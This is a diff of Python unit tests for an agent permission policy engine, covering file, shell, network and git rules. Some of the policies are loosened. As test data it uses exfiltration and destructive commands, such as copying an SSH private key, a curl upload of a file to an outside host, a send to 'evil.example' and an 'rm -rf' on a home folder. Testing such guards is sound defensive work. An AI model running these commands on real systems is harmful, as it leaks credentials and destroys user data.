@@ -58,14 +58,14 @@ def test_read_inside_root_allowed() -> None:
     assert d.action is PolicyAction.ALLOW
 
 
-def test_read_outside_root_workspace_asks() -> None:
+def test_read_outside_root_is_free_in_workspace() -> None:
     d = PolicyEngine().decide(CAPABILITY_FS_READ, _scope(), path="/etc/passwd")
-    assert d.action is PolicyAction.ASK
+    assert d.action is PolicyAction.ALLOW
 
 
-def test_read_outside_root_read_only_denied() -> None:
+def test_read_outside_root_is_free_in_read_only() -> None:
     d = PolicyEngine().decide(CAPABILITY_FS_READ, _scope(profile="read-only"), path="/etc/passwd")
-    assert d.action is PolicyAction.DENY
+    assert d.action is PolicyAction.ALLOW
 
 
 def test_read_outside_root_full_access_allowed() -> None:
@@ -73,10 +73,21 @@ def test_read_outside_root_full_access_allowed() -> None:
     assert d.action is PolicyAction.ALLOW
 
 
-def test_read_sensitive_file_asks_even_full_access() -> None:
-    d = PolicyEngine().decide(CAPABILITY_FS_READ, _scope(profile="full-access"), path="/etc/.env")
+def test_system_secret_asks_even_full_access() -> None:
+    d = PolicyEngine().decide(
+        CAPABILITY_FS_READ, _scope(profile="full-access"), path="/home/xainner/.ssh/id_ed25519"
+    )
     assert d.action is PolicyAction.ASK
-    assert "locked system rule" in d.reason
+    assert d.rule_id == "system_secret"
+    assert "allow_project" not in d.choices
+
+
+def test_project_env_files_are_ordinary_work() -> None:
+    for path in ("/proj/.env", "/proj/.env.example", "/proj/credentials.json"):
+        d = PolicyEngine().decide(CAPABILITY_FS_READ, _scope(), path=path)
+        assert d.action is PolicyAction.ALLOW, path
+        w = PolicyEngine().decide(CAPABILITY_FS_WRITE, _scope(), path=path)
+        assert w.action is PolicyAction.ALLOW, path
 
 
 def test_sensitive_file_detection() -> None:
@@ -117,11 +128,11 @@ def test_write_chat_session_asks() -> None:
     assert d.action is PolicyAction.ASK
 
 
-def test_write_home_in_project_denied() -> None:
-    # project at /proj, write to $HOME -> locked system rule
-    d = PolicyEngine().decide(CAPABILITY_FS_WRITE, _scope(), path="/home/xainner/evil.py")
-    assert d.action is PolicyAction.DENY
-    assert "$HOME" in d.reason
+def test_write_outside_project_asks_and_can_be_granted_for_good() -> None:
+    d = PolicyEngine().decide(CAPABILITY_FS_WRITE, _scope(), path="/home/xainner/notes.md")
+    assert d.action is PolicyAction.ASK
+    assert d.rule_id == "write_outside_root"
+    assert "allow_project" in d.choices
 
 
 def test_write_home_chat_workspace_asks_not_allows() -> None:
@@ -168,11 +179,11 @@ def test_shell_read_only_denied() -> None:
     assert d.action is PolicyAction.DENY
 
 
-def test_shell_chat_asks() -> None:
-    d = PolicyEngine().decide(
-        CAPABILITY_SHELL, _scope(kind="CHAT", root=None, cwd=HOME), command="ls"
-    )
-    assert d.action is PolicyAction.ASK
+def test_shell_chat_runs_but_writing_into_home_asks() -> None:
+    chat = _scope(kind="CHAT", root=None, cwd=HOME)
+    assert PolicyEngine().decide(CAPABILITY_SHELL, chat, command="ls").action is PolicyAction.ALLOW
+    touch = PolicyEngine().decide(CAPABILITY_SHELL, chat, command="touch ./evil.txt")
+    assert touch.action is PolicyAction.ASK
 
 
 def test_shell_workspace_external_write_asks() -> None:
@@ -194,23 +205,26 @@ def test_shell_full_access_external_write_allowed() -> None:
     assert d.action is PolicyAction.ALLOW
 
 
-def test_shell_sensitive_target_never_reusable() -> None:
+def test_shell_secret_target_asks_without_a_lasting_grant() -> None:
     d = PolicyEngine().decide(
         CAPABILITY_SHELL,
         _scope(profile="full-access"),
-        command="Set-Content .env secret",
+        command="cp /home/xainner/.ssh/id_rsa ./key",
     )
     assert d.action is PolicyAction.ASK
-    assert d.reusable is False
-    assert d.choices == ("deny", "allow_once")
+    assert d.rule_id == "system_secret"
+    assert "allow_project" not in d.choices
 
 
-def test_shell_git_push_asks() -> None:
-    d = PolicyEngine().decide(
+def test_git_push_is_free_in_full_access_and_asks_in_workspace() -> None:
+    full = PolicyEngine().decide(
         CAPABILITY_SHELL, _scope(profile="full-access"), command="git push origin main"
     )
-    assert d.action is PolicyAction.ASK
-    assert d.risk == "high"
+    assert full.action is PolicyAction.ALLOW
+    work = PolicyEngine().decide(CAPABILITY_SHELL, _scope(), command="git push origin main")
+    assert work.action is PolicyAction.ASK
+    assert work.rule_id == "git_remote_mutation"
+    assert "allow_project" in work.choices
 
 
 def test_shell_force_push_asks_critical() -> None:
@@ -436,3 +450,91 @@ def test_audit_trail() -> None:
     audit = engine.audit()
     assert len(audit) == 1
     assert audit[0].granted is True
+
+
+# -- permissions v3: hard list, untrusted content, local network -------------
+
+from dataclasses import replace as _replace  # noqa: E402
+
+from rinari.policy.engine import (  # noqa: E402
+    CAPABILITY_MCP_WRITE,
+    CAPABILITY_NETWORK,
+    CAPABILITY_SESSION_MESSAGE,
+)
+
+
+def test_hard_list_asks_in_full_access_and_never_for_good() -> None:
+    full = _scope(profile="full-access")
+    force = PolicyEngine().decide(CAPABILITY_SHELL, full, command="git push --force origin main")
+    delete = PolicyEngine().decide(CAPABILITY_SHELL, full, command="rm -rf /home/xainner/Music")
+    for d in (force, delete):
+        assert d.action is PolicyAction.ASK
+        assert d.choices == ("deny", "allow_once")
+        assert d.reusable is False
+    assert delete.rule_id == "delete_outside_root"
+    inside = PolicyEngine().decide(CAPABILITY_SHELL, full, command="rm -rf ./build")
+    assert inside.action is PolicyAction.ALLOW
+
+
+def test_full_access_acts_without_asking() -> None:
+    full = _scope(profile="full-access")
+    engine = PolicyEngine()
+    assert engine.decide(CAPABILITY_MCP_WRITE, full).action is PolicyAction.ALLOW
+    assert (
+        engine.decide(CAPABILITY_NETWORK, full, host="api.example.com", network_mode="send").action
+        is PolicyAction.ALLOW
+    )
+    assert (
+        engine.decide(CAPABILITY_SESSION_MESSAGE, full, target="ses_b").action is PolicyAction.ALLOW
+    )
+    assert engine.decide("capability.activate", full).action is PolicyAction.ALLOW
+    assert engine.decide("state.mutate", _scope()).action is PolicyAction.ALLOW
+
+
+def test_after_external_content_sending_out_asks_even_in_full_access() -> None:
+    tainted = _replace(_scope(profile="full-access"), external_content=True)
+    engine = PolicyEngine()
+    for decision in (
+        engine.decide(CAPABILITY_NETWORK, tainted, host="evil.example", network_mode="send"),
+        engine.decide(CAPABILITY_MCP_WRITE, tainted),
+        engine.decide(CAPABILITY_SHELL, tainted, command="git push origin main"),
+        engine.decide(CAPABILITY_SHELL, tainted, command="curl -d @notes.txt https://x.example"),
+    ):
+        assert decision.action is PolicyAction.ASK
+        assert decision.rule_id == "external_content_send"
+        assert "allow_project" not in decision.choices
+    # Reading more, and local work, stay free.
+    assert (
+        engine.decide(CAPABILITY_NETWORK, tainted, host="docs.example").action is PolicyAction.ALLOW
+    )
+    assert engine.decide(CAPABILITY_SHELL, tainted, command="npm test").action is PolicyAction.ALLOW
+
+
+def test_local_network_is_free_and_internet_sends_ask_in_workspace() -> None:
+    engine = PolicyEngine()
+    work = _scope()
+    for host in ("127.0.0.1", "localhost", "192.168.0.3", "casa3090"):
+        assert (
+            engine.decide(CAPABILITY_NETWORK, work, host=host, network_mode="send").action
+            is PolicyAction.ALLOW
+        ), host
+    send = engine.decide(CAPABILITY_NETWORK, work, host="api.example.com", network_mode="send")
+    assert send.action is PolicyAction.ASK
+    assert send.binding_mode == "exact"
+    read_only = engine.decide(
+        CAPABILITY_NETWORK, _scope(profile="read-only"), host="api.example.com", network_mode="send"
+    )
+    assert read_only.action is PolicyAction.DENY
+
+
+def test_shell_classification_false_positives() -> None:
+    engine = PolicyEngine()
+    work = _scope()
+    for command in (
+        r"move /y build\hero.mp4 assets\video\ >nul",
+        'ssh casa3090 "docker exec db pg_dump -U app > /tmp/dump.sql"',
+        "echo ok 2>NUL",
+    ):
+        assert (
+            engine.decide(CAPABILITY_SHELL, work, command=command).action is PolicyAction.ALLOW
+        ), command
